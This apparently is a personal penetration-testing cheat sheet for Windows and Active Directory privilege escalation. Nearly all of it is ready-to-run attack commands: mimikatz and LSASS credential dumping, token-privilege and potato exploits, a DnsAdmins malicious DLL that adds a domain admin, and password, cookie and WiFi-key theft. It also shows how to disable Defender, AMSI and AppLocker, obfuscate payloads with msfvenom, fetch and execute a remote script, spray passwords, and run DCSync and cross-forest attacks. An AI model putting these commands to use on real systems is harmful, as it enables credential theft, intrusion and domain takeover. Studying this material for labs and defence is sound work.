        Import-Module .\SeBackupPrivilegeUtils.dll
	    ```
		```powershell
        Import-Module .\SeBackupPrivilegeCmdLets.dll
	    ```

	2. Enable the privilege
		```powershell
		Set-SeBackupPrivilege
		```
	3. Powershell
	 ```powershell
		Copy-FileSeBackupPrivilege '[PATH\TO\FILE]' .\[OUT]
		```
- **AD/Local**: DiskShadow

	1. Create a shadow copy of the `C` drive and expose it as `E` drive.
		```powershell
		diskshadow.exe
		DISKSHADOW> set verbose on
		DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
		DISKSHADOW> set context clientaccessible
		DISKSHADOW> set context persistent
		DISKSHADOW> begin backup
		DISKSHADOW> add volume C: alias cdrive
		DISKSHADOW> create
		DISKSHADOW> expose %cdrive% E:
		DISKSHADOW> end backup
		DISKSHADOW> exit
		dir E:
		```

	2. **AD**: Copy `NTDS.dit` from the shadow copy:
		```powershell
    Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit	
    robocopy /B E:\Windows\NTDS .\ntds ntds.dit
	    ```

	3. **Local**: Extract SAM Hashes

		```cmd
		reg save HKLM\SYSTEM SYSTEM.SAV
		reg save HKLM\SAM SAM.SAV
		```

	4. Export on Kali & retrieve hashes

		```bash
		secretsdump.py -ntds [NTDS_FILE] -system [SYSTEM_FILE] LOCAL
		secretsdump.py -system system.sav -sam sam.sav LOCAL
		```

#### SeDebug

Allows to steal credentials from common processes or get a SYSTEM shell, by executing the [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master/x64) binary 

- [Mimikatz](https://github.com/ParrotSec/mimikatz) / [Invoke-Mimikatz](https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) → [All Commands / Techniques](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/mimikatz-cheatsheet.md)

- Meterpreter Dumping

	1. pgrep [winlogon/lsass]` → `migrate [PID]
	2. Dumps credentials using most of the Mimikatz modules
	3. `load kiwi`
	4. `creds_all`
	5. `hashdump`

- LSASS Dumping (contains some domain hashes)

	```cmd
	mimikatz '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords /patch"'
	```

	- If it doesn't work: LSAIO Bypass
		- `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → Check if Enabled
		- `misc::memssp` → `privilege::debug` → `!+` → `!processprotect /process:lsass.exe /remove`
	- Manual, without mimikatz
                		1. Get PID → `Get-Process lsass`, `tasklist /svc`
                		2. `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] [OUT_DMP] full`
                		3. `pypykatz lsa minidump [DMP_FILE]`     → After DMP is Tranferred to Kali

- RDP / DPAPI / VAULT Dumping

	```cmd
	mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'
	mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::credman"'
	mimikatz.exe '"privilege::debug" "token::elevate" "vault::cred /patch"'
	```

- SAM / LSA Dumping (steals *local* hashes -> users appearing in `net user`)

	```cmd
	mimikatz.exe '"privilege::debug" "token::elevate" "lsadump::sam"'
	mimikatz.exe'"privilege::debug" "token::elevate" "lsadump::lsa /patch"'
	mimikatz '"privilege::debug" "token::elevate" "lsadump::secrets /patch"'
	```

- SYSTEM Shell (RCE)

	- Meterpreter
		- `pgrep [winlogon/lsass]` &rarr; Get PID
		- `migrate [PID]`
	- Manual
		- `tasklist` &rarr;  Get `winlogon` or `lsass` PID
		- [Method 1](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1)  → `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
		- [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
		- [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)

#### SeImpersonate / SeAssignPrimaryToken

You must be a **Service Account:** `NT *` or a member of a group with name `SQL / IIS / NETWORK / LOCAL`

Get the [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise):

1. Download and transfer CLSID.list
2. Transfer `~/TOOLS/PRIVESC_WINDOWS/clsid.bat`
3. Run in PS `Start-Process clsid.bat`
4. Get one of the `AUTHORITY\SYSTEM` 

Potatoes:

- Churrasco - Server 2003
- [JuicyPotato](https://github.com/k4sth4/Juicy-Potato/tree/main) - Server 2008 - 2016 - Win 10 < 1803
- [GodPotato](https://github.com/BeichenDream/GodPotato/releases) - Server 2012 - 2022
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) - Windows 10 / Server 2016 - 2019
- [GenericPotato](https://github.com/micahvandeusen/GenericPotato) - Windows 7 - 10 / Server < 2019
- [Hot Potato](https://github.com/Kevin-Robertson/Tater) - Windows 7 - 10 / Server 2008 - 2012 - PS Based
- [MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato) - When Others Fail → Useful for MSSQL
- Meterpreter shell (auto exploit, when the exploit is old), not stealthy
	- try `getsystem` directly
	- `load incognito` 
	- `list_tokens -u` -> Lists allowed users to impersonate
	- `impersonate_token [USER]` -> Double Backlashes for Username!

#### SeLoadDriver

It allows to **load and unload device drivers** with the creation of a registry entry with specific values for `ImagePath` (where the `.sys` driver file is located) and `Type` (kind of driver).

Thus, we can exploit it though the Capcom driver, that allows any user to execute shellcode with SYSTEM privileges. 

Following this [GUIDE](https://github.com/cbbn00/SeLoadDriverAbuse) (different in [academy](https://academy.hackthebox.com/module/67/section/605))

1. Open an SMB share from `~/TOOLS/PRIVESC_WINDOWS/SeLoadDriverAbuse`

2. Copy in this location (IMPORTANT)

	```cmd
	copy \\[IP]\share\shell.exe c:\windows\tasks\shell.exe
	```

3. Load the driver:

	```cmd
	\\[IP]\share\EoPLoadDriver.exe System\CurrentControlSet\Capcom \\[IP]\share\Capcom.sys
	```

4. Exploit:

	```cmd
	\\10.10.14.178\share\ExploitCapcom.exe
	```

#### SeTakeOwnership

1. [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file: 

	```cmd
	takeown /f '[FILE/FOLDER]'
	```

2. Modify the file ACL (Access Control List)

	```cmd
	icacls "[FILE/FOLDER]" /grant %username%:F
	```

- `F`: full access
- `R/W` Read/write access

Some example files:

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

Also `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts...

### Groups

-  `whoami /all` 
-  Check non-default groups -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)

#### DnsAdmins (AD)

Members of the **DnsAdmins** group can exploit their  privileges to load an arbitrary DLL with SYSTEM privileges on a DNS  server, often hosted on **Domain Controllers.**

- **Add the user to Domain Admin**

	1. Check your role:

		```powershell
		Get-ADGroupMember -Identity DnsAdmins
		```

	2. Write a DLL to go from DNS Admin to Domain Admin (or rev shell)

		- Easier, less stealthy

			```powershell
			msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
			```

		- Follow [KDNS Method](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

			- Clone the [mimikatz repository](https://github.com/gentilkiwi/mimikatz) and go inside `mimilib` folder

			- Change [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) by adding a `system("CMD_HERE");` below the `fclose()` line in the file and remove the `klog()` line

			- Compile `mimilib.dll`
				```bash
				x86_64-w64-mingw32-gcc -shared -o evil.dll kdns.c #64-Bit
				i686-w64-mingw32-gcc -shared -o evil.dll kdns.c   #32-Bit
				```

	3. Load the custom DLL

		```cmd
		dnscmd.exe /config /serverlevelplugindll [PATH]\adduser.dll
		```

	4. Restart the DNS service (if you have permissions) or wait

		```cmd
		sc stop dns				# Makes the AD stop working
		sc start dns
		```

	5. Confirm (look for you user)

		```cmd
		net group "Domain Admins" /dom
		```

	6. Clean-up (if not in CTF)

		```cmd
		reg query \\[IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
		reg delete \\[IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
		sc.exe start dns
		sc query dns
		```

- **Create WPAD Record**

	To perform traffic spoofing and steal passwords

	1. Disable the global query block list

		```cmd
		Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
		```

	2. Add WPAD Record to Kali

		```cmd
		Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address [KALI_IP]
		```

	3. Use [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing

#### Event Log Reader

They can read logs.

- Read priviliged logs

	```cmd
	wevtutil qe Security /rd:true /f:text | findstr "/user"
	```

	- `/u:[USER] /p:[PASS]` Add credentials of the Log Reader

- Read general logs

	```powershell
	Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
	```

	- Run as another user with the `-Credential` parameter.
#### Exchange Windows Permission (AD)

&rarr; WriteDacl over the Domain
#### Hyper-V Administrators (AD)

Firefox's Mozilla Maintenance Service can be exploited to execute commands as SYSTEM, by creating a hard link to a protected SYSTEM file and replacing it with a malicious  executable:

bash

```bash
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```

Note: Hard link exploitation has been mitigated in recent Windows updates.

#### Print Operators

See SeLoadDriver privilege

##### Server Operators

- Full Services Access  → BinPath Overwrite: add yourself to Administrators

	1. Find a service run by Local system

	2. Add yourself to administrator 

		```cmd
		sc config AppReadiness binPath= "cmd /c net localgroup Administrators [USER] /add"
		sc start AppReadiness
		```

	3. Restart

	4. Retrieve NTLM Passwords (or other):

		```cmd
		secretsdump.py server_adm@10.129.43.9 -just-dc-user Administrator
		```

#### Organization Management (AD)
&rarr; GenericAll over the Organizational unit `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.
## Credential Hunting

- Default Listing Command -> `dir /a /r`

### SAM Repair

  - `C:\Windows\Repair\[SAM/SYSTEM]`
  - Dump Hashes if Readable
### Shell Logging

- CMDKey
	  1. `cmdkey /list`
	  2. If Interactive: `runas /savecred /user:[USER] [COMMAND]`

- Console History
  
  ```powershell
  (Get-PSReadLineOption).HistorySavePath
  
  gc (Get-PSReadLineOption).HistorySavePath
  
  foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
  ```
  
  ```cmd
  dir /adh /s /b ConsoleHost_history.txt
  ```
  
- Clipboard (copy-paste)
  - Native: `Get-Clipboard`
  - Monitor the clipboard (if there is a logged in user): 
                	`Invoke-ClipboardLogger` from [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) in `~/TOOLS/PRIVESC_WINDOWS`

- Transcripts & Logs
  - `dir C:\Transcripts`
  - `Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView`
  - `Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview`
                ### Important Files
- **Important files**, in root

  ```cmd
  dir /a /s /b id_rsa id_ed* credentials.db access_tokens.db legacy_credentials accessTokens.json azureProfile.json netsetup.log iis6.log "Custom Dictionary.txt" sysprep.xml sysprep.inf php.ini my.cnf my.ini docker-compose.yml Dockerfile server.xml confCons.xml tomcat-users.xml kibana.* confCons.xml *.passwd ultravnc.ini smtp.* elasticsearch.* FreeSSHDservice.ini AppEvent.Evt SecEvent.Evt SiteList.xml unattend.xml Groups.xml ConsoleHost_history.txt plum.sqlite RDCMan.settings sam.bak sam.old sam.save sam.sav system.old system.sav system.bak system.save *.git-credentials config.ini index.dat *.kdbx *.vhd *.vhdx *.vmdk *.rdp *.cred cookies.sqlite 2>nul
  ```
  - Transfer `.sqlite` files on linux and read with `sqlite3 [FILE]` or use `strings`
  - Extract KeePass Hash `keepass2john [FILE].kdbx`
  - `confCons.xml`: see Local Applications
  - `.vhd`, `.vhdx`, and `.vmdk` files
- **Powershell `.ps1` files**: if they call an `xml` file to store credentials though DPAPI, that is invoking the command `GetNetworkCredential()`, they can be decrypted by the user that has access to the powershell file

	```cmd
	findstr /spin "GetNetworkCredential()" *.ps1 *.ps1*
	```

	Ignore the chocolatey files.
	Get the `.xml` file and crack

	```powershell
	$credential = Import-Clixml -Path '[FILE].xml'
	$credential.GetNetworkCredential().username
	$credential.GetNetworkCredential().password
	```
- **SCCM Logs**
	- `%WINDIR%\system32\CCM\logs\*.log`
	- Access Log Files in Directory
- ProgramData Configs: `C:\ProgramData\Configs\*`
                ### Active Directories
- **Exchange Mailbox [MailSniper](https://github.com/dafthack/MailSniper) (AD)**
	- `Invoke-SelfSearch -Mailbox current-user@domain.com`
	- `Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv`
	- [SnaffPoint](https://github.com/nheiniger/SnaffPoint) → SharePoint AD Sites
                ### Registry Keys

- Check for a string in the whole registry

	```cmd
	reg query [HKLM/HKCU] /f "[STRING]" /t REG_SZ /s /[k/d]
	```

- Common Keys

	```cmd
	reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" && reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" && reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" && reg query "HKCU\Software\ORL\WinVNC3\Password" && reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password" && reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings" && reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" && reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
	```

- Putty Session

	1. Get Session Names 

		```cmd
		reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions"
		```

	2. Get Password Inside

		```cmd
		reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\[SESSION_NAME]"
		```

### WiFi Passwords

- Get the SSID of WiFi Points

	```cmd
	netsh wlan show profile
	```

- Get Passwords

	```cmd
	netsh wlan show profile [SSID] key=clear
	```

### Drives
- **Accessible Disks:**
	- `wmic logicaldisk get caption,description,providername || fsutil fsinfo drives`
	- `Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root`
- **Snapshot restic Recovery** - Requires a password (check env)
    1. Set the restic Password in the environment
  ```powershell
	$env:RESTIC_PASSWORD = "[BACKUP_PASS]"
	```
    2. Discover Folders by navigating to the previously discovered driver with `dir`, since `cd` won't work
    3. Get ID (latest is the last one)
	```cmd
	restic.exe -r [DRIVER]:\[FOLDER] snapshots
	```
    4. Restore backup
	```cmd
	restic.exe -r E:\restic restore [SNAPSHOT_ID] --target [OUT_PATH]
	```
	
### Traffic Sniffing


- TcpDump:

  ```cmd
  tcpdump -i [NIC] -nn -s0 -v port [PORT] -w [OUT_PCAP]
  ```

- Wireshark (GUI) - if installed

- Open results in Kali using [net-creds](https://github.com/DanMcInerney/net-creds)

### File Hunting
#### Extension search
In interesting directories

```cmd
dir /a /s /b *pass*.txt *pass*.xml *pass*.ini *cred* *secret* *vnc* *.snt *.config *.cfg *.ppk *.p12 *.cer *.gpg *.pgp *.zip *.rar *.gz *.7z *.zip *.rar *.doc *.docx *.xls *.xlsx *.bat *.ps1 *.ovpn *.vnc *.yml
```
- `/a`: Shows **all** files, including hidden and system files.
    
- `/s`: Recursively lists files 
    
- `/b`: Uses **bare format**
                #### Checking File Content

```cmd
findstr /spin "[STRING]" *.[EXT1_OR_*] *.[EXT2]
```

```powershell
Get-ChildItem -Include * -File -Recurse -Force -ErrorAction SilentlyContinue | Select-String -Pattern [STRING]
```

- Strings     → `pass`, `psw`, `pwd`, `auth`, `cred`, `[HOSTNAME]`, `[USERNAME]`, `[DOMAIN]`
- Separator  → `=`, `:`, `,`, `"`, `'`
- Some readable extension: `*.xml *.ini *.txt *.ps1 *.bat *.config *.cfg *.yml *.git`
## Local Network Services

- Enumeration
    ```cmd
	 netstat -ano | findstr LISTEN | findstr /v "::" | findstr /v "0.0.0.0"
    ```

	1. Look for processes that don't listen globally (after the `0.0.0.0` in the first column) 
	2. get the `PID` (4th column)
	3. `tasklist /v /fi "status eq RUNNING" | findstr [PID`]
	
- Network Information
  - `route PRINT`
  - `ipconfig /all`

## System Services

### Enumeration

- Manual:

	```cmd
	wmic service get name,displayname,startmode,startname,pathname | findstr /iv "c:\windows\\" | findstr /iv "Disabled" | findstr /iv "Unknown"
	```

	Autorun services - Services that can only be triggered by a user login

	```cmd
	wmic startup get name,location,command,user
	```
	
- Auto: 

  - CMD: [SharpUp](https://github.com/GhostPack/SharpUp/) `.\SharpUp.exe audit`
  - Powershell: PowerUP - `Invoke-AllChecks`

### Exploit

- **DLL Hijacking** - [Resource](https://juggernaut-sec.com/dll-hijacking/)

  - Find all Loaded DLLs of a startable service executable (enumerated above)

    - Procmon - Needs RDP + Application Transfer
      - Filters: `Path Ends With = .dll`
      - Filters: `Process Name Is = [SERVICE_EXECUTABLE]`
      - Start Procmon Capture -> Re-start service -> Observe Traffic -> Stop Capture
      - More General Approach

    - PowerUP
      - `Find-ProcessDLLHijack -ExcludeOwned -ExcludeWindows` 
      - DLL Of Running Processes (Less General)

  - Check if the one of the following is true

    - DLL is being loaded from a writable path

    - DLL is `NAME NOT FOUND`

      - Check if you can write in the directory from which it's not found

      - Check if you can write anywhere in the PATH of the system

      - ```cmd
                        for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" && echo.
    ```

  - Place a malicious DLL with MSF using the correct name and trigger the service

- **Unquoted Path**:

  Every time there is a space, try to see if you can write that folder with an executable with the name up to that position of the path. 

  E.g. `C:\Program Files\GVFS\GVFS.Service.exe` &rarr; write `C:\Program.exe`

- **Replace Binary**

  See if you directly write the binary

- **Path Overwrite**

  - BinPath (only normal services)

  	```cmd
  	sc config [SERVICE] binPath="[MALWARE/CMD]"
  	```

  	First try to write `" "` to check if you have permission

  - ImagePath (only on autorun services)

  	```powershell
  	Set-ItemProperty -Path HKLM:[REG\PATH] -Name "ImagePath" -Value "[CMD]"
  	```

- **Restart:**

  - Manual: `sc [stop/start] [SERVICE]` (`sc query` to verify)
  	- The service will fail to start
  - Auto: `shutdown /r /t 0`

## Local Processes

### Enumeration

- Running processes:

  - Every running process

  	```cmd
  	tasklist /v /fi "STATUS eq running" | findstr /vi "%USERNAME%"
  	```

  - Processes spawnd by a service:

  	```cmd
  	tasklist /svc | findstr /vi "N/A" | findstr /vi "svchost"
  	```

  - Check if it is 32 or 64bit (can be 32 even if the architecture is 64 for retro compatibility) (important for BUFFER OVERFLOW!)

  	```cmd
  	wmic process get Name, MaximumWorkingSetSize
  	```

  	If the Size is > 3096, then it is 64bit

- Process Spying

  - Create a powershell `ps1` script:

	  ```powershell
	  while($true){
	    $process = Get-WmiObject Win32_Process | Select-Object CommandLine
	    Start-Sleep 1
	    $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
	    Compare-Object -ReferenceObject $process -DifferenceObject $process2
	  }
	  ```
	- Look for scripts that could be recurrent
    ```cmd
                	  dir /a /r /q /s /b *.bat *.ps1 *.vbs *.eps
    ```
                		Try to overwrite them, `icalcs [FILE]` to see permissions
                ### Vulnerable Processes

- [Splunk     → Forwarder Abuse](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) / [Splunk Admin RevShell](https://github.com/0xjpuff/reverse_shell_splunk/)
- [Erlang     → Port 25672](https://malicious.link/posts/2018/erlang-arce/)

### Named Pipes

File that can make two processes communicate. List all pipes with [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):

```cmd
accesschk.exe /accepteula -w \pipe\* -v
```

Look for `GENERIC_WRITE` / `FILE_ALL_ACCESS` or any kind of `WRITE`

- [WindScribeService Exploit](https://www.exploit-db.com/exploits/48021)
                ### Scheduled Tasks
                By default, we can only see tasks created by our user and default scheduled tasks

```cmd-session
schtasks /query /fo LIST /v | findstr /iv "\Microsoft*"
```
Look at `Run as User` to see who is running the task.


## Local Applications

```cmd
wmic product get name,version,installlocation | findstr /iv "microsoft" | findstr /iv "windows"
```
### Relevant directories:

- `C:`
  - `inetpub\wwwroot` web application folder
  - `inetpub\ftproot` ftp root application
  - `xampp`, `wamp`: XAMPP Services
  - custom folders -> `passcore` / Other Installed Software
- `C:/Program Files` and `C:/Program Files (x86)`
  - custom/non default applications
  - Mozilla Maintenance Service -> Firefox Memory Dump
- `C:/ProgramData`
- `C:/Users/[USERNAME]/appdata`
                ### Common Applications

- **[Druva** 6.6.3](https://www.exploit-db.com/exploits/49211) &rarr; meterpreter upgrade, run `background` and search for druva

- **Docker Desktop Community Edition** < 2.1.0.1 &rarr; [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e)
- **mRemoteNG**
	- By default, saves credentials in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml`
	- In`Connections -> Protected` (same line) is the master password used to encrypt the document.
	- Under `Connections` there are `Nodes` containing remote passwords
	- If the user didn't set a *custom* master password, use [RemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to crack the password under some element named `Node`
    ```bash
    python3 ~/TOOLS/PRIVESC_WINDOWS/mRemoteNG-Decrypt/mremoteng_decrypt.py -s "[Node_Encrypted_Pwd]" -p [Master_Decrypted_pwd]
    ```
	- Try to crack the master password:
    ```bash
    for password in $([FILE]);do echo $password; python3 ~/TOOLS/PRIVESC_WINDOWS/mRemoteNG-Decrypt/mremoteng_decrypt.py -s "[Node_Encrypted_Pwd]" -p $password 2>/dev/null;done 
    ```
#### Browsers

- **Chrome**

	- Check if chrome is installed 

		```cmd
		dir %LOCALAPPDATA%\Google\Chrome
		```

	- Use [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve saved passwords 

		```cmd
		.\SharpChrome.exe logins /unprotect
		```
- **Firefox**
	- Find cookies in `cookies.sqlite`
	- Extract them:
    ```bash
                	python3 ~/TOOLS/PRIVESC_WINDOWS/cookieextractor.py --dbpath "cookies.sqlite" --host slack --cookie d
    ```
- **Chromium**
                	1. Find cookies
                	2. Extract them with [SharpChromium](https://github.com/djhohnstein/SharpChromium) 
    ```powershell
                		IEX(New-Object Net.WebClient).DownloadString('[PATH]/Invoke-SharpChromium.ps1');
                		Invoke-SharpChromium -Command "cookies slack.com" 
    ```
                     Note that you should copy the cookies in the location expected by `SharpChromium`
                ## Evasion

### Antivirus Evasion

You have an antivirus when you cannot execute malwares [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)

- Enumeration
  - General: `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
  - **Defender only:** `Get-MpComputerStatus`
- Folder Exclusion Bypass
  - Check Folders -> `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
  - Place Malware in Allowed Folder
- Disable AV (Code Execution as Admin)
  - `powershell Set-MpPreference -DisableIOAVProtection $true`
  - `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
- Malware Obfuscation tools:
  - `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe -x [WIN_BINARY] > out.exe` -> Choose "whoami" / "ping" / "plink"
  - [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
  - Prometheus Shell
    - [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
    - 32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`

### Powershell evasion

- Execution Policy
  - From cmd
  
  	```cmd
  	powershell -noni -nop -ep bypass -c [COMMAND]
  	```
  
  - From Powershell
  
  	```powershell
  	Set-ExecutionPolicy Bypass -Scope Process
  	```
  
- AMSI
  - Paste the payload in a PS session to bypass AMSI
  - [Payloads Here](https://amsi.fail)
  
- Constrained Language
  - Check if enabled -> `$ExecutionContext.SessionState.LanguageMode`
  - [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
  
- **AppLocker:** allows or denies execution on applications in certain folders
    ```powershell
                    Get-AppLockerPolicy -Effective | select -exp RuleCollections where {$_.action -eq Deny} | select-object
    ```

  - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders

## Citrix Breakout

### Path Restrictions

Goal: Open dialog box (Paint, Notepad, Wordpad, etc. ) to accessed blocked directories or SMB shares

#### Paint

1. click on `File > Open` to open the Dialog Box.

2. Set File-Type to `All Files`

3. Enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\[DESIRED_DIR]` under the File name field to access a forbidden directory

4. Enter `\\[TUNIP]\share` to access a SMB share 

5. Load `pwn.exe` on SMB

	```c
	#include <stdlib.h>
	int main() {
	  system("C:\\Windows\\System32\\cmd.exe");
	}
	```

6. Right-click on the executable and launch it since copy is not available

#### Shortcut files

1. Find or create a shortcut
	-  Transfer an existing shortcut file using an SMB server. 
	- Create a new shortcut file using PowerShell as mentioned under [Interacting with Users section](https://academy.hackthebox.com/module/67/section/630) under `Generating a Malicious .lnk File` tab
                2. `Right-click` the shortcut.
                3. Select `Properties`.
                4. Set `Target` to `C:\Windows\System32\cmd.exe`

#### Script Execution

When script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file.

### Alternative Application

- File Explorer:
	- `Q-Dir` 
	- [Explorer++](https://explorerplusplus.com/)
- Registry Editor:
	- [Simpleregedit](https://sourceforge.net/projects/simpregedit/), 
	- [Uberregedit](https://sourceforge.net/projects/uberregedit/) 
	- [SmallRegistryEditor](https://sourceforge.net/projects/sre/)
                # AD Escalation

## Password spraying

Use the tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password [PWD] -ErrorAction SilentlyContinue
```

## Enumeration
Enumerate with [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- User
    ```powershell
                	Get-DomainUser -Domain [DOMAIN]
    ```
- Group memberships
    ```powershell
                  Get-DomainGroupMember -Identity [GROUP] -Recurse
    ```
- Domain Trust
    ```powershell-session
                	Get-DomainTrustMapping
    ```
- Admin Access
    ```powershell
                Find-LocalAdminAccess
    ```

# Active Directories

## DCSyinc
Gets the hash of everybody

   ```bash
   secretsdump.py [CHILD_DC_AUTH] -just-dc-user [CHILD_BASE_NAME]/Administrator
	```
## Trust Escalation (domain admin)

Enumerate child-parent and cross-forest trusts:
- From Linux
	- `netexec`
		```bash
		nxc ldap [DC_IP] -u 'user' -p 'pwd' --dc-list
		```
	- Bloodhound: Analysis -> Map domain trusts
- From Windows
	- Enumerate trusts 
		```cmd
		netdom query /domain:[CURRENT_FOREST] trust
		```
		- The [CURRENT_FOREST] is the last two pieces of your domain
	-  Look for <-> Bidirectional trusts (only those are exploitable))
	 - Get the domain controller of the forest
		```cmd
		netdom query /domain:[CURRENT_FOREST] dc
		```

### Child -> Parent
1. `addhost [PARENT_DC_IP] "[PARENT_DC_FQDN] [PARENT_DOMAIN]"`
2. Add to `/etc/resolv.conf`
	1. `domain [PARENT_DOMAIN]`
	2. `nameserver [PARENT_DC_IP]`
3. If you are only domain admin, but not domain administrator become one:
   ```bash
   secretsdump.py [CHILD_DC_AUTH] -just-dc-user [CHILD_BASE_NAME]/Administrator
	```
4. Go to parent
	```bash
	raiseChild.py -hashes [ADMIN_HASH] [CHILD_DOMAIN]/Administrator
	```

### Cross-Forest
1. `addhost [FOREST2_DC_IP] "[FOREST2_DC_FQDN] [FOREST2_DOMAIN]"`
2. Add to `etc/resolv.conf` 
	- `domain [FOREST2_DOMAIN]`
	- `nameserver [FOREST2_DC_IP]`
3. KerbeRoast Attack
   ```bash
   GetUserSPNs.py [FOREST1_AUTH] -request -target-domain [FOREST2_DOMAIN]
	```
	- Crack hashes
4. Foreign Membership
	- Generate two zip files and upload them to Bloodhound
	  ```bash
	  bloodhound-python [AUTH_FOREST1] -d [FOREST1] -dc [FOREST1_DC] -c All; bloodhound-python [AUTH_FOREST1_EMAIL] -d [FOREST2] -dc [FOREST2_DC] -c All
		```
	- Analysis -`Dangerous Rights -> Foreign Domain Group Membership` Queries → Abuse Membership